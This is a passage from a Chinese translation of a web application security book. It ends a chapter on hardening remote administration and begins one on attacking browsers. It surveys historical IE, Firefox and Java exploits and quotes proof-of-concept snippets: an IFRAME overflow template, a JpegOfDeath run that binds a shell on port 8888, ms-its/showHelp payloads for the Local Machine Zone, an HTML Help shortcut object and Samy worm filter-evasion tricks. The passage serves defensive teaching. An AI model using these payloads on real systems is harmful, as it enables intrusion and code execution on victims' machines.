可以在 Web.config 中输入值而手动添加密钥，也可以通过输入 “AutoGenerate” 自动生成验证密钥值。如果你希望对每一个应用都有一个单独的密钥值，你可以给 validationKey 值添加 IsolateApps 修正。关于 Web.config 的 <machineKey> 元素的更多信息的链接，在本章末尾的 “参考和进一步阅读” 一节中。

提示 如果你有一个 Web 服务器群，你可能要将所有的服务器都设置成相同的 ViewState 验证密钥，而不是让每个服务器自动生成一个（这样做可能会破坏你的应用）。

### 9.5 小结

本章描述了大量的执行远程 Web 服务器管理和内容管理/创作工具和服务。所有的这些接口，都可以被使用端口扫描的攻击者轻松地发现，并进行相关的弱点利用。弱点有已知的软件缺陷，弱（默认）密码，或者不正确的权限控制。因此，Web 应用程序架构应该考虑远程管理以及确保能够其安全地实现。下面是本章中提到的加固远程 Web 服务器管理的一般性方针：

认证所有远程管理访问。

☐ 确保使用强健的密码，一定要确保重设了厂商的默认密码！

☐ 将远程管理限制到一个 IP 地址或一个很小的 IP 地址组。

o 使用能抗窃听的安全通信协议（比如，SSL 或 SSH）。

- 使用一个单独的服务器作为多个服务器远程管理的终端, 而不是在每个 Web 服务器上都配置管理服务。

另外，通常应该谨慎地限制 Web 服务器可访问的内部网络的服务类型，记住，一个 Web 服务器很可能在某个时候经历一次严重的安全攻击，如果 Web 服务器有很多映射到内部文件服务器的驱动盘，那么你的内部网络也面临着同样的威胁。考虑使用 Sneakernet（即通过一个可移动媒介，将内容移动到一个物理上隔离的 DMZ 分布服务器上）来更新 Web 服务器，保证它们与公司的余下网络保持物理隔离。

我们也讨论了由管理员或开发者造成的常见 Web 应用错误配置（我们将这些与现成组件中的错误进行对照，现成组件错误在第 3 章中讨论过）。我们注意到，最危险的错误配置之一是留下了不需要的 Web 服务器扩展，在历史上，对这些模块的攻击曾带来了重大的影响。我们也演示了如何对付常见的 Web 应用源代码信息泄漏的问题，包括 HTML 源代码、常见目录和文件名习惯，Internet 缓存，比如 Wayback Machine，状态页面等等。在开发者方面，我们引用包含文件作为常见的信息泄漏源，并展示了一个通过攻击隐藏表单字段来攻击 Microsoft 的 ASP.NET ViewState 默认功能的例子。希望这些例子说明了在你的 Web 应用上，如何堵截最常见和的最具破坏性的信息泄漏。

### 9.6 参考和进一步阅读

#### 链 接

#### FrontPage

微软的 FrontPage 站点 http://office.microsoft.com/frontpage

“如何与 FrontPage 2000 一起使用 http://support.microsoft.com/?kbid=URLScan”

309394

“如何与 FrontPage 2002 一起使用 http://support.microsoft.com/?kbid=URLScan”

318290

##### WebDAV

RFC 2518, WebDAV

mod_dav:一个 Apache 的 DAV 模块

Mod_dav:一个 Apache 的 WebDAV 模块

“如何为 IIS 5 禁用 WebDAV”

ftp://ftp.isi.edu/in-notes/rfc2518.txt

http://www.Webdav.org/mod_dav/

http://www.Webdav.org/mod_dav/

http://support.microsoft.com/?kbid=241520

#### 公告、通报和漏洞

Marc Slemko 撰写的文章：“微软

FrontPage98 安全漏洞”，关于 UNIX 上 http://www.worldgate.com/~marcs/fp/

Fp98 的服务器扩展

绿盟安全通报（SA2001-03），关于 FPSE http://www.nsfocus.com/english/

VSRAD 缓冲区溢出

微软安全公告 MS01-035，关于 FPSE http://www.microsoft.com/technet/

VSRAD 缓冲区溢出

security/bulletin/MS01-035.asp

#### 免费工具

Windows 版的 Netcat

http://www.atstake.com/research/tools/nc11nt.zip

Cadaver, 一个 UNIX/Linux 下的 WebDAV 命令行客户端

加利福尼亚大学列出的 WebDAV 客户端和服务器的软件实现

微软 IIS Lockdown 和 URLScan 工具

## 第 10 章 攻击 Web 客户端

到目前为止，我们一直在讨论识别、利用和减轻常见的 Web 应用程序漏洞，并且把重点放在服务器端的缺陷上。但是客户端的情况又是怎样呢？

在历史上，Web 应用的客户端安全曾经有过相对短暂的安宁时期，最主要的原因是当时攻击者更关注服务器端的大量漏洞（可以通过它们获得整个客户列表）。由于服务器端的安全性的提高，攻击者已经转移到了下一个明显的攻击点了。

稍稍看一眼最近的新闻头条，就会明白 Web 客户端安全已经变成了多么巨大的灾难。诸如钓鱼软件、间谍软件和恶意广告软件这样的术语，以前只被技术人员使用，现在却经常在主流媒体上出现。世界主流的 Web 客户端软件中的漏洞，好像从来就没有减少过。有组织的犯罪分子利用 Web 客户端技术对在线客户和商户进行欺诈的案例层出不穷。很多政府终于开始认识到，至少有同样多的严重安全漏洞在 Internet 的另一端——客户端存在，而且很多其他的因素使它们更容易受到攻击。

在本章中将讨论这些因素和相关的漏洞。我们的讨论将围绕下列 Web 客户端的基本攻击类型来进行：

O 漏洞利用（Exploits）通过明显的漏洞（包括软件 bug 和/或错误配置），在 Web 客户端和它的主机系统上运行恶意的可执行代码。如果没有这些漏洞，攻击者要运行代码显然会困难很多，他们一般会转而使用杀手锏：社会工程（参见下一分类）。

○ 欺骗（Trickery）无论客户端平台上有无明显的漏洞，使用欺骗技术，都会导致Web客户端软件的使用者发送有价值的信息给攻击者。攻击者其实是使用一些诱惑消息吸引客户，然后使客户端（和/或它的使用者）直接发送敏感信息给攻击者，或者安装一些软件，攻击者以此从客户端系统得到数据。

和之前一样，我们会在关键的地方讨论对抗措施，也会在本章的最后进行总结。

### 10.1 漏洞利用

此类攻击的必要前提是使得 Web 客户端执行攻击者提供的代码。从攻击者的角度来说，有两种主要方法可以注入可执行的内容：

##### ☐ 实现中的漏洞

##### ☐ 设计中的问题

当阅读本章后面关于漏洞利用的部分时，需要记住这几个问题。

攻击者必定希望受害者查看包含有漏洞利用代码的 Web 内容。最直接的方法是发送包含攻击者所控制的 URL 的电子邮件给受害者。

大多数这类漏洞的影响，取决于受攻击 Web 客户端所运行的安全环境。如果运行的是一个管理员账号，那么通常系统能被完全控制。当然，如果攻击的是普通用户账号也很难阻止攻击者，因为无论如何，普通用户账号通常也会提供对用户私人信息的访问。在本章稍后的“低权限浏览”里，我们将讨论主流浏览器厂商是如何应对该问题的。

我们将关注两个浏览器：Mozilla 的 Firefox 和微软的 Internet Explorer（IE），因为写这本书时，它们几乎占有了全部的市场。但大部分浏览器都建立在诸如 HTTP 和 HTML 的标准上，对常见问题（比如跨域脚本访问）的解决方案，同样也是实际上标准的工程解决方案，所以我们讨论的很多问题对大部分 Web 客户端都适用（无论真正的漏洞利用程序发布与否）。

我们也将重点讨论与 Windows 用户相关的漏洞利用和对抗措施，因为 Windows 是当前主流的客户端计算环境。

### 实现中的漏洞

Web 客户端实现中的漏洞（大部分）来自无意识的错误，比如糟糕的输入处理。实现中的漏洞的经典例子是可怕的缓冲区溢出，它是软件挥之不去的梦魇。由于 Web 客户端被广泛的部署，人们已经越来越多地对此类缺陷进行严格的安全检查。举个例子，2004 年末，Michal Zalewski 在安全邮件列表 Bugtraq 上发布了一个叫做 “manglme” 浏览器的 fuzzing 工具。很正常，所有的这些关注使得我们找到了一些严重的 bug，其中的一些将在下一节中进行讨论。

此类漏洞的最严重例子之一是 2006 年 3 月 Computer Terrorism 公布的 IE createTextRange 漏洞。该 bug 来源于 IE 的 createTextRange() 方法中的一个缺陷，当这个方法被恰当地触发时，会导致系统引用一个非法的内存地址。“Darkeagle” 公布了一段利用

代码，巧妙地使用很长的 nop（空指令）来作为指针进行填充，从而增大该非法引用落入到其中一个已填充指针中的几率。这将会导致执行利用代码的 Shellcode（在 Darkeagle 的代码中只是打开计算器 calc.exe）。该漏洞曾经是一个经典的 “IE 0-day”，因为这段攻击代码在 Microsoft 发布补丁之前公布。

另一个例子是在 2004 年末发现的 IE IFRAME 缓冲区溢出，它是由 felinemenace.org 的 “Ned” 使用 Zalewski 的程序发现的。他发现把超长的字符串加入到 < IFRAME > 标志的 “SRC” 或 “NAME” 属性中，就可以在 Windows XP SP1 和 Windows 2000 的 IE 6.0 上执行任意指令。该漏洞实际上导致了堆的溢出，这需要在漏洞利用前做一些准备工作。Berend-Jan Wever（也叫做 Skylined）发布了在端口 28876 上绑定 Shell 的漏洞利用代码，使攻击者能获得对受害系统的控制台访问，其访问权限与运行 IE 的用户权限相同。

Skylined 漏洞利用代码由 HTML 实现，包含了一些 JavaScript，来分配堆内存，并填满指针（因此叫做 “no-operation instruction”，无操作指令，或者 nopsleds）和利用代码的 Shellcode。HTML 利用代码的第二个部分是使用 IFRAME 漏洞本身来引用 nopsled 指针。

<IFRAME SRC=file://BBB[578个B] NAME="CCC[2,086个C][nopsled pointer bytes]</IFRAME>

因为堆内存中已经充满了 nopsled 的引用，因此 Skylined 的利用代码极有可能击中其中的某一个 nop，然后顺着往下执行到 Shellcode。在我们的测试中，该利用代码在 Windows XP 的 IE 6 上会导致内存警告（因此该原型代码在设计时不是为了秘密地执行），但仍可以很好的工作。

该漏洞在 2004 年末被 Bofra 和 MyDoom AG 的变种攻击过。它也曾被广为人知的广告木马利用来劫持受害者浏览器，并基于用户所浏览站点中的关键字，强迫浏览器显示弹出广告，为广告者带来收入。

像任何软件一样，基于 Mozilla 的浏览器也存在自己的问题。在 2006 年 2 月，Mozilla 宣布在 Firefox 中存在多个漏洞，其类型范围从整数溢出、缓冲区溢出、已释放内存的使用、堆破坏到跨域访问。其中的一个典型的例子就是，2006 年初 HD Moore 报告的在 Location 和 Navigator 对象的 “QueryInterface” 方法中严重的堆溢出，这份报告是在 Georgi Guninski 之前秘密报告给 Mozilla 基金会报告的基础上形成的。随后，HD Moore 发布了一个 Metasploit Framework 模块来利用该缺陷。

在 2005 年 9 月，Tom Ferris 报告了在 Firefox 多语种域名（Internationalized Domain Name，IDN）处理中，有一个基于堆的缓冲区溢出，该漏洞是在处理域名中含有 0xAD 字符（Unicode 的“软连字符”）的 URL 时会发生错误。通过欺骗用户查看一个 HTML 文档，攻击者可以以该用户的权限执行任意指令。Berend-Jan Wever（就是“SkyLined”）发布了

基于类似我们讨论过的 IE IFRAME 缓冲区溢出利用技术的利用代码：用指针（nopsleds）和利用代码的 Shellcode 大片覆盖堆内存，以致当 IDN 漏洞触发时，它很可能会击中在堆内存中所故意覆盖的某个区域。

和 IE 一样，Firefox 在 2004 年末也受到了 Zalewski 测验工具的检验，这推动了对早期 Firefox 版本的更新。关于所有这些问题更多的信息，请参阅“参考和进一步阅读”。

Java 漏洞 Sun Microsystem 创建的 Java 编程模型，主要是为了构建便于移植和重用的软件应用程序。Java 包括一个安全沙箱，能阻止程序员的很多会导致安全漏洞的错误，比如缓冲区溢出漏洞。通过阅读 Java FAQ，或者阅读 Java 规范（参见“参考和进一步阅读”），你可以更加详细地知道大部分的这些特性。从理论上来说，这些机制非常难以攻陷。但是在实际中，由于在实现时没有遵循这种设计，Java 安全被攻破了很多次。

在 2004 年 11 月，安全研究员 Jouko Pynnonen 公布了 Sun 的 Java 插件中的一个严重漏洞，该插件允许浏览器运行 Java Applet。该漏洞本质上允许恶意 Web 页面禁用 Java 的安全限制，从而打破了有效保护平台安全的 Java 沙箱。Jouko 曾在 Java 的反射 API（Reflection API）中发现了一个漏洞，该漏洞允许访问受限的私有的类库。下面是一个概念验证 JavaScript，它访问了私有类 sun.text.Utility。

[script language=javascript]

var c=document.Applets[0].getClass().forName('sun.text.Utility');

alert('got Class object: '+c)

[/script]

令人恐惧的是，除了 Java Apple，JavaScript 也可以访问到私有类，这使得通过 Web 浏览器可以轻易地进行跨平台攻击。sun.text.Utility 类并不令人感兴趣，但是 Jouko 在他的公告里提到，攻击者可以访问其他的私有类来进行真正的破坏——例如，获得对内存的直接访问，或者修改 Java 对象私有字段的方法（这样可以禁用 Java 安全管理器）。

Jouko 在 2005 年年中再次查出 Java 的问题，他报告在 Java Web Start（一种方便客户端配置 Java 应用的技术）中存在一个严重漏洞。一旦安装了 Java Runtime Engine（JRE），浏览器，比如 IE，就被默认配置成自动打开 JWS 文件，JWS 文件定义了 Java 运行时的属性（这些文件的扩展名为.jnlp）。只要在.jnlp 文件中省略特定参数周围的引号，就可以禁用 Java 沙箱，允许攻击者加载恶意 Java Applet 来攻击系统。Jouko 提供了一个概念验证漏洞利用代码，引入一个在恶意 Web 服务器上的 jnlp 文件，由一个 IFRAME 启动，从而避免用户交互；然后 jnlp 文件替代攻击者 Web 服务器上的任意一个安全策略文件，从而代替默认 Java 安全沙箱。新的策略获得了对 Java 应用程序的全部权限，包括启动基于操作系统二进制可执行文件的能力。这样，系统一切尽在掌控中了。

可怕的是，在任何支持 Java Web Start 的平台上，包括 Windows 上的 IE，或者 Linux

上的 Mozilla Firefox 和 Opera，该利用代码都可以运行。

Web 图像解析漏洞 一旦某个漏洞趋势在主流 Internet 客户端软件上曝光了出来，安全研究人员就会一窝蜂地扑上去，而且经常在类似的软件流程中发现其他的漏洞。因此，在 2004、2005 和 2006 年，几乎所有的 Web 客户端都成为了共享图像解析器中实现缺陷的受害者。无论浏览器或 E-mail 读者，显示图像是 Web 客户端的一个共同要求。因此处理通用 Web 图像格式诸如 JPEG，GIF，PNG，甚至没那么通用的格式诸如 BMP 和 WMF 的软件，都成为了攻击者自然而然的目标。

最严重的一个例子，是 2005 年末由 WebSense 的 Dan Hubbard 报告给微软的 Windows Metafile（WMF）问题。当处理一个 WMF 文件失败时，WMF 包含的特殊构造的 SETABORTPROC “Escape” 记录将允许执行任意函数。通过欺骗用户直接打开一个恶意 WMF，或者浏览带有这样图像的恶意 Web 站点，或者甚至使用诸如 Google 桌面搜索（Google Desktop Search，GDS）本机上的索引内容，都可以利用该漏洞。

注意 卡巴斯基实验室声称，在 Microsoft 公告发布前几个星期，WMF 的利用代码曾以 4000 美元的价格在 Internet 上进行交易。

有人可能会指出，这更多的是一个设计问题，因为那时候，SETABORTPROC Escape已被废弃，只是提供来与16位版本的Windows实现兼容。真正的罪魁祸首是Microsoft的支持向下兼容的一贯主张，因为SETABORTPROC Escape不过是按照最初设计的那样在运行。事实上，Microsoft接下来的补丁有效地禁用了SETABORTPROC，这支持了这种观点。

漏洞的利用代码和漏洞的公告几乎同时出现在 Internet 上。HD Moore 发布了一个 MetaSploit Framework 模块，几种病毒/蠕虫和恶意广告木马便开始使用该漏洞利用代码，更多这些恶意软件的链接请参阅“参考和进一步阅读”。

另一个不错的例子是 Microsoft 的 Graphics Device Interface（GDI+）JPEG 处理器中的整数下溢漏洞，由 Nick DeBaggis 报告给 Microsoft，并在 2004 年 9 月公布。利用这个漏洞方法也非常简单——只要让用户访问一个恶意构造的 JPEG 文件，攻击者就可以用当前用户的上下文权限（对于大多数家庭用户来说，一般是管理员）执行任意命令。Microsoft 公告发布不到几天，在 Internet 上就出现封装好的漏洞利用代码。它可以生成恶意 JPEG，在监听端口上绑定一个命令行 Shell 或者给远程攻击者机器弹出一个反向 Shell。这使得构造恶意 JPEG 相当轻松，即使是脚本小子也可以轻松完成。该漏洞利用代码的例子包括 FoToZ 的 MSjpegExploitByFoToZ.c 和 John Bissell 的 JpegOfDeath.c（根据最初的 FoToZ 代码编写，其链接请参见“参考和进一步阅读”）。

使用 Bissel 的利用代码生成工具很简单——提供必要的参数然后运行工具，就可以生成一个带有你期望的参数的恶意 JPEG 文件。在下面这个例子中，我们在端口 8888 上选择

简单的绑定模式（该模式在执行 JEPG 的机器上打开一个监听器）。当然，你必须提供你想生成的文件的名字。我们选择了 AnnaKournikova（俄罗斯网坛美女库尔尼科娃）这个名字，这可能会在特定的 Internet 用户社区中引起极大的兴趣（唉，好奇杀死猫啊）。

C:\>jpeg -p 8888 AnnaKournikova.jpg
+------------------+
| JpegOfDeath - Remote GDI+ JPEG Remote Exploit |
| Exploit by John Bissell A.K.A. HighT1mes |
| September, 23, 2004 |
+------------------+
Exploit JPEG file AnnaKournikova.jpg has been generated!

点击嵌入在 HTML 页面上的到 AnnaKouurnikova.jpg 的链接，exploit 代码就会利用缓冲区溢出并以当前用户的身份执行 Bissel 的 Shellcode。中需远程登录到目标系统的 8888 端口就会得到一个带有同样权限的命令行 Shell。这样远程攻击者现在可以完全控制用户的会话了。

另一个图像处理缺陷导致潜在破坏的典型例子是在 2004 年 8 月公布的 PNG 图形库漏洞。Chris Evans 在审查 libpng PNG 参考库的源代码时，发现了这些问题。当然，漏洞利用代码很快在 Internet 上出现了。“infamous42md” 在 Bugtraq 上发布了 po.c（我们认为是概念验证 “proof-of-concept” 的简写）和一个叫做 pngslap.c 的相关测试工具，它们很快就流传到了 Internet 上的很多站点。这些漏洞利用代码的效果几乎和我们刚才讨论的 JPEG/GDI+ 漏洞利用代码相同（源代码中的注释推荐内存偏移为 0xbfff8b0）。

“Zcrayfish”也公布了一个 PNG 概念验证漏洞利用代码，但在写这本书的时候已经不可用了。当页面还存在的时候，在我们的测试中，该站点上的 PNG 图片在 Windows XP SP2 运行的 IE 6.0 的 pngfilt.dll 中产生了可靠的崩溃。为了帮助你理解使用诸如 Zcrayfish 例子的图片有多简单，考虑下面这个插入到一个无辜的 HTML E-mail 中的  $ 1 \times 1 $ 像素的 PNG 图像（事实上是不可见的）：

<img src="http://zcrayfish.augurtech.com/bad.htm/bad/bad206.png" width=1  height=1  alt="bad206.png">

libpng 和参考库真正引起恐慌的是，它们可以相当隐秘地链接到其他应用程序中。除了取决于开发者链接该代码的内存地址，确认产品可能受到该漏洞影响的唯一方法就是分析源代码或二进制代码本身。关于该问题的一个有趣对比是，在发布最初漏洞公告的时候，Microsoft 没有提到它的产品是否会受到影响，而 Mozilla 基金会和 Opera Software ASA 几乎立即为它们受到影响的产品发布了补丁。

在我们结束对图形处理漏洞的讨论前，值得一提的是，在 libpng 和 JPEG/GDI+问

题发现之前，Microsoft 已经发布过其他图形处理库的相关漏洞，包括 BMP 和 GIF 两种主流的图像文件类型。更多的信息请参见“参考和进一步阅读”。

#### ☑ 针对实现中的漏洞的对抗措施

减少实现中的漏洞的主要建议是及时打补丁。如果你不熟悉其所喜欢的浏览器的安全补丁公告列表和下载站点，那么就不应该使用 Internet。IE 用户可以使用诸如 Microsoft 的自动升级工具，来设置自动下载和更新。

当然，没有谁总是能够永远及时地打上补丁。最好的 0-day 攻击预防措施是围堵政策。以较低的权限或在一些沙箱中运行常见的目标软件，诸如 Web 浏览器，这样即使受到了最新 0-day 的攻击，损害也能被限制在整个系统中非敏感的部分。更多的信息请参见“低权限浏览”一节。

虽然软件控制策略（Software Restriction Policies，SRP，之前叫做 SAFER）还没被广泛地接受，Microsoft 还是从 Windows XP 和 Server2003 开始，在它的操作系统中包含了这种工具。SRP 由 IT 管理员用于通过活动目录组策略（Active Directory Group Policy）管理环境，它基于一些参数（包括文件的加密指纹，软件发行商用来数字签名一个文件的证书，本地或通用的文件保存路径的命名规范，或软件可以下载的 IE Internet 区域），控制可以运行的软件的类型（包括诸如 ActiveX 的组件）。虽然由于软件改变十分频繁（举个例子，假设每半个月要更新来自 Microsoft 的补丁，想一想你需要多频繁地更新 IE 的 SRP 签名），通过 SRP 管理安全是件痛苦的事情，但它的确对那些希望强制实现安全的人们带来了一些好处。

注意 SRP 可以使用某些已公布的方法绕过，参见 “参考和进一步阅读”。

当然，所有的这些都不会影响用户采取基本的最低权限最佳实践的效果。不要作为超级用户使用浏览器，在浏览时也要随时保持警惕。特别小心那些提示你安装软件或组件的对话框，而且决不要在 E-mail 里点击来自不可信源的超链接。

#### 设计中的问题

Web 客户端设计中的问题来自于为产品特别设计的“特性”，这些特性给攻击者提供了无尽的漏洞利用目标。无心的实现中的漏洞和特意设计的特性，这两者间的界线并不太清晰，两者经常都被利用来攻击设计中的问题。我们将会用一些例子尝试阐明二者的细微差别。

跨域访问 该问题最常见的例子之一是跨域访问攻击。大多数现代的浏览器使用基于“域”的安全模型，域是任意的安全边界，其设计来是为了防止来自一个源（通常通过一个DNS域指定）的 windows/帧/文档/脚本，与来自另一个位置的资源交互。这一点有时也被称为“同源策略”（Same-Origin Policy），出自最初的 Netscape JavaScript 参考手册。举个例子来说，如果 evilsite.com 可以在 Citibank.com 上执行 JavaScript，那么 Citi 的客户都将成为受害者，只用通过一封简单的含有可以劫持客户 Cookie 的恶意脚本的电子邮件，就可以登录到 Citi 在线银行 Web 站点，然后把现金转到攻击者所选择的西联汇款（Western Union）的位置上。

IE 跨域攻击的历史源远流长，而且各种各样。在 2006 年，Matan Gillon 演示了如何将层叠样式表（Cascading Style Sheets，CSS）注入到包含大括号（{ }）的远程 Web 页面中。大括号经常用来定义样式选择器、属性和值。通过利用 IE 中 CSS 解析器的漏洞和 Google 的一个执行疏忽，Gillon 构造了一个概念验证漏洞利用代码，能够在用户使用 Google 的桌面搜索时，悄悄地窃取用户数据。

在 2005 年初，Greyhats Security 和 http-equiv 的 Michael Evanchik，Paul 报告了 HTML 帮助 ActiveX 控件（HTML Help ActiveX Control，hhctrl.ocx）没有正确地确认要通过“相关主题”命令打开的窗口源，从而导致允许攻击者打开两个不同的窗口而指向同一个域，因此可以连接父窗口跨过域安全边界。顺便说一下，该 hhtctrl.ocx 问题是微软在 Windows XP Service Pack 2 （XP SP2）中实现了本机电脑区域（Local Machine Zone，LMZ）锁定后报告的，但之后更多的问题被报告。

在 2004 年中期，来自 GreyHats Security 的 Paul 报告了 IE 有一个缓存混淆漏洞，当父域被改变时，IE 就会完全忘记一个函数的缓存参考源，这使攻击者可以控制缓存函数所执行的上下文。只要让用户浏览一些恶意 HTML，就可以执行攻击者所选择的任意域中的执行脚本。这样的漏洞列表还有很多。

Firefox 也同样多次沦为跨域漏洞的猎物。如之前提到的，2006 年 2 月公布的漏洞包括几个与跨域访问相关的漏洞。其他令人印象较深刻的 Firefox 跨域访问漏洞，包括了使用 Firefox 早期对浏览制表符的实现，来绕过同源限制而实现的攻击。

在 2006 年 1 月，研究员 Michal Zalewski 发现了一个基于 DNS 名的同源规则的设计问题。该问题的本质早已被熟知：一个域必须使用特定数目的句号或圆点来定义，以避免违反同源限制。在商业浏览器中，所执行的标准规则是两个或多个圆点定义一个子域。大多数情况下，不会出现问题。即：在子域 “support.site.com” 和父域 “site.com” 间交互内容是允许的，但是访问其他域诸如 “othersite.com” 则会被同源规则阻止。

但是，因为国际域名命名习惯的不同，两圆点的规则不总是可靠的。比如，“site.com”

和 “site.co.uk”，它们很可能与同一个父组织相关，但是由于两圆点的同源实现，它们会被大多数浏览器当做成单独的组织。更糟糕的是，基于击溃 IE 和 Firefox 中所做的 “多点” 执行的假设，Zalewski 提出了三种方法，在特定情况下绕过同源限制。Zalewski 文章——“Cross-Site Cooking”（这是他起的名字）的链接，请参见 “参考和进一步阅读”。

攻击 IE LMZ IE 本机电脑区域（Local Machine Zone，LMZ，也被称为“我的电脑”区域），是为了区分潜在的恶意远程脚本和“友好”地从本机加载的可执行文件。LMZ 是 IE 实现域安全模型的一个特殊区域，其中的代码是以运行 IE 的用户的权限来执行的。因此，一般攻击者设法注入恶意代码到 LMZ。LMZ 注入攻击发展得如此迅速，以至于 Microsoft 最终在 Windows XP Service Pack 2（XPSP2）上发布了一个叫做“本机电脑锁定”（Local Machine Lockdown）的功能。多年来，很多人争论，认为整个远程访问“友好的”本地脚本的概念都是不切实际的，应该丢弃整个 LMZ 设计。

一个典型的例子是，没过多久，声名狼藉的 Web 客户端黑客 http-equiv 就绕过了 LMZ 锁定，这说明了防范设计问题是一个继续存在的难题。Thor Larholm 提供了对这份漏洞利用代码原理的详细描述。从本质上说，该漏洞利用代码使用 HTML 图像元素（image element，IMG），其 DYNSRC 属性指向一个远程文件，当该图像被拖放到一个本地内容的窗口时，DYNSRC 属性中指向的文件会被放置到受害机的一个已知位置。http-equiv 发布了一个叫做 “ceegar.html” 的演示漏洞利用代码，该代码采用 AnchorClick 行为在一个已命名窗口中打开 “C:\WINDOWS\PCHealth\”，这可以被 DYNSRC 属性中所引用的文件作为拖放指针使用。

Rafel Ivgi 在 2004 年年中发布了 LMZ 访问机制的另一个例子。荷兰安全研究员 Jelmer Kuperus（网名 jelmer）编写了概念漏洞利用代码，在恶意 Web 页面（或 HTML E-mail）里面使用 IE 中的 showModalDialog 方法，在用户屏幕的左上方创建一个模式对话框窗口（模式对话框在打开时保持输入焦点，在对话框关闭前用户不能切换窗口）。该模式对话框引用另一个对象（IFRAME）的位置。通过一种定时欺骗，Jelmer 在模式对话框打开时改变 IFRAME 的位置，由于存在的漏洞，当它关闭时，IFRAME 引用的位置就处在 Jelmer 的控制下，并被设置成 LMZ。下面的插图显示了 Jelmer 的概念漏洞利用代码的模式对话框——你可以从该窗口的状态栏中看到，它在“本机电脑”安全区域中执行。接下来，Jelmer 在这个 LMZ 中更多的 IFRAME 中加载一些 JavaScript 脚本。这些脚本完成“核心工作”：利用随 IE 安装的 ADODB.stream ActiveX 控件来从他的站点复制一个可执行文件到本机并运行（它覆盖了位于“C:\Program Files\Windows Media Player\wmplayer.exe”的 Windows 媒体播放器的可执行文件来掩饰真正的企

图）。Jelmer 的可执行文件是一个没有危害的图形小程序，但是关键在于——代码现在能以登录用户的完全权限执行。

在 2004 年初，Thor Larholm 宣布精心构造的 InfoTech Storage（ITS）和聚合 HTML 文档（MIME-Encapsulated HTML，MHTML）URI 可以允许恶意的 HTML 代码在 IE 的 LMZ 中运行。该漏洞利用代码通过引用一个恶意的压缩的 HTML 帮助（Compressed HTML Help，CHM）文件而运行，此文件利用微软对 ITS 或 MHTML 的协议实现。CHM 一直因被作为漏洞利用媒介滥用而声名狼藉。下面是一个恶意链接例子，可以用来攻击该漏洞。注意其中的双斜线，这是触发输入验证错误的关键：

ms-its:mhtml:file://C:\nosuchfile.mht!
http://www.example.com//exploit.chm::exploit.html

在这个例子中，exploit.html 会在 LMZ 的上下文中执行。微软花了一个多月的时间为该漏洞发布补丁。

另一个一直被跨域访问所利用的 IE 特性是 `showHelp` 函数。`showHelp` 是一个 IE 窗口方法，用来显示 HTML 和 CHM 文件。在 2003 年，Andreas Sandblad 报告 file:// 和 res://URI 能够绕过对 `showHelp` 设定的可以打开的文件类型限制。下面是他提供的简单例子：

showHelp("file:")
showHelp("res://shdoclc.dll/about.dlg")
showHelp("javascript:alert('Alert in the LMZ')")

第一行实际上禁用了对 `showHelp` 所加的安全限制，`showHelp` 在通常情况下只能够打开.htm 和.chm 文件。最后两行分别加载资源和可执行 JavaScript 到 LMZ 中。同年不久，Arman Nayyeri 报告了一个 `showHelp` 的目录遍历漏洞，该漏洞允许在受害系统上远程执行任意 CHM 文件。Nayyeri 的概念验证漏洞利用代码如下所示（由于页面宽度的限制，手工加入了换行符）：

showHelp("mk:@MSITStore:iexplore.chm::\\\\\\\\\\chmfile.chm::/fileinchm.html")

Nayyeri 还宣称，如果在 `showHelp()` 调用中使用双冒号字符串（`...`），那么目标 CHM 文件并不一定要含有 .chm 扩展名。

Georgi Guninski 使用 showHelp 频繁打开含有指向任意代码的快捷方式的 CHM 文件。在下面这个来自 Georgi 的例子中，CHM 文件包含了启动写字板的快捷方式：

<OBJECT
id=hh
classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"
width=100

height=100>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",wordpad.exe,">
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
/*alert(window.location +" "+ document.URL);*/
hh.Click();
</SCRIPT>

JavaScript 和活动脚本 JavaScript 最初叫做为 “LiveScript”，经常被人与 Sun 的 Java 联想到一起。JavaScript 实际上是 Netscape Communications 在 20 世纪 90 年代中期创建的完全独立的脚本语言。JavaScript 是现在 Web 上使用最广泛的客户端脚本语言，甚至跨越微软客户端和在线服务。

JavaScript 兼有 Perl 的易用性和 C/C++ 的强大功能，因此它非常流行。但是，这些特征也使得它立即吸引了恶意攻击者的注意。即使是最简单的 JavaScript 方法，也可以弹出窗口，读/写 Cookie，利用它欺骗用户输入敏感的信息，或者发送他们的敏感数据到其他的站点。

Microsoft 平台使用基于称为动态脚本（Active Scripting）技术的组件对象模型（Component Object Model, COM），来执行 JavaScript 和其他客户端脚本语言（比如 Microsoft 自己的 VBScript）。

平心而论，JavaScript 和动态脚本引入的安全挑战，并不一定是由于技术本身而造成的（虽然已经公布的一些漏洞与所有的软件语言的漏洞类似），而是由于它们的易访问性和强大的功能，从而很容易被滥用去做坏事。另外，就像我们在本章中所看到的那样，这些技术可以成为一种破坏性的工具，用来利用 Internet 客户端软件的其他安全漏洞，特别是之前讨论的跨域访问违例问题。

一些这样的问题被用来攻击下一代 Web 技术——Ajax（异步 JavaScript 和 XML，Asynchronous JavaScript and XML，其背景请看 Wikipedia）。阐明 Ajax 潜在安全问题的一个最好例子是 MySpace 或者 “Samy” 蠕虫，它们在 2005 年 10 月击垮了流行的在线社会网络站点 MySpace.com。一个叫做 Samy 的 MySpace 用户，决心让他的知名度（知名度是指有多少其他 MySpace 用户添加 Samy 的信息到他们的“好友”列表）激增，于是他使用一段 JavaScript 攻击代码，凡是浏览过他的信息的人，都会把 Samy 的信息自动添加到他们的“好友”列表中。而且，由于浏览 Samy 的原始信息而被感染的人，当他们的信息被其他任何人查看时，又会传染给其他人。不到 20 个小时，Samy 拥有了超过百万的好友请求。MySpace.com 因此断线一段时间来处理 Samy 蠕虫的扩散。

Samy 发布的技术解释中（其链接参见“阅读和进一步阅读”）首先就指出“我们需要 JavaScript 来做所有的事情”，这说明了攻击在线用户时，使用 JavaScript 的必要性。Samy 余下的解释很值得一读，详细描述了他用来绕过 MySpace.com 中诸多输入验证的绝妙方法。一些精彩的地方包括：

☐ 把 JavaScript 嵌入到 CSS 标记中（MySpace 阻止了其他所有的 HTML 标记）。

- 使用 “java\nscript”（即 java[换行]script）避免 MySpace 过滤 “javascript” 单词。这是某些浏览器中的实现缺陷。在解释代码时，浏览器实际上忽略了换行）。

- 使用 JavaScript 的 String.fromCharCode 来把十进制的 ASCII 码转换成引号（"），这样来避免对引号的限制。

- 使用 XML-HTTP 对象（Ajax 的核心功能）来执行关键的 GET 和 POST 受害者的信息（这种方法还可以伪装成 MySpace 的 Cookie 和其他令牌以阻止脚本访问某些页面）。

